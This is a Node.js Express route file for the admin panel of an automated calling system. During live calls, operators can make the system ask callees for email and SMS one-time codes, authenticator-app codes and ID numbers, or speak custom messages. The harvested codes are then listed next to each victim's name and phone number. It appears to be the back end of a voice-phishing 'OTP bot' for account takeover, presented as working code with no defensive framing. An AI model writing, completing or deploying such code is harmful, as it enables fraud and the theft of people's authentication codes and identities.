const express = require('express');
const router = express.Router();
const db = require('../database/db');

router.post('/request-action/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const { action } = req.body;
    const io = req.app.get('io');
    
    let currentAction = '';
    let actionMessage = '';
    
    switch(action) {
        case 'email_otp':
            currentAction = 'waiting_for_email_otp';
            actionMessage = 'Please enter the OTP sent to your email followed by the pound key.';
            break;
        case 'auth_otp':
            currentAction = 'waiting_for_auth_otp';
            actionMessage = 'Please enter the code from your authenticator app followed by the pound key.';
            break;
        case 'phone_otp':
            currentAction = 'waiting_for_phone_otp';
            actionMessage = 'Please enter the OTP sent to your phone followed by the pound key.';
            break;
        case 'id_number':
            currentAction = 'waiting_for_id';
            actionMessage = 'Please enter your ID number followed by the pound key.';
            break;
        default:
            return res.status(400).json({ error: 'Invalid action' });
    }
    
    try {
        // Update the session action - this interrupts the music
        await db.query(
            `UPDATE call_sessions SET current_action = $1 WHERE id = $2`,
            [currentAction, sessionId]
        );
        
        await db.query(
            `INSERT INTO admin_logs (session_id, action_type) VALUES ($1, $2)`,
            [sessionId, action]
        );
        
        // Emit to dashboard
        io.emit('admin_action', { 
            session_id: sessionId, 
            action: action,
            message: actionMessage 
        });
        
        res.json({ success: true, action: action });
    } catch (error) {
        console.error('Error requesting action:', error);
        res.status(500).json({ error: error.message });
    }
});

router.post('/custom-voice/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const { message } = req.body;
    const io = req.app.get('io');
    
    try {
        await db.query(
            `UPDATE call_sessions SET current_action = 'custom_voice' WHERE id = $1`,
            [sessionId]
        );
        
        await db.query(
            `INSERT INTO admin_logs (session_id, action_type, action_value) VALUES ($1, $2, $3)`,
            [sessionId, 'custom_voice', message]
        );
        
        io.emit('admin_action', { 
            session_id: sessionId, 
            action: 'custom_voice', 
            message: message 
        });
        
        res.json({ success: true, message: 'Custom voice command sent' });
    } catch (error) {
        console.error('Error sending custom voice:', error);
        res.status(500).json({ error: error.message });
    }
});

router.get('/contacts', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT id, phone_number, full_name, email_otp, auth_otp, phone_otp, id_number, status, created_at 
             FROM contacts ORDER BY created_at DESC`
        );
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.get('/active-calls', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT cs.id as session_id, cs.call_sid, cs.current_action, cs.status, 
                    c.phone_number, c.full_name
             FROM call_sessions cs
             JOIN contacts c ON cs.contact_id = c.id
             WHERE cs.status NOT IN ('completed', 'failed')
             ORDER BY cs.started_at DESC`
        );
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

router.get('/session-data/:sessionId', async (req, res) => {
    try {
        const result = await db.query(
            `SELECT cd.*, c.full_name, c.phone_number 
             FROM collected_data cd
             JOIN call_sessions cs ON cd.session_id = cs.id
             JOIN contacts c ON cs.contact_id = c.id
             WHERE cd.session_id = $1
             ORDER BY cd.collected_at DESC`,
            [req.params.sessionId]
        );
        res.json(result.rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

module.exports = router;
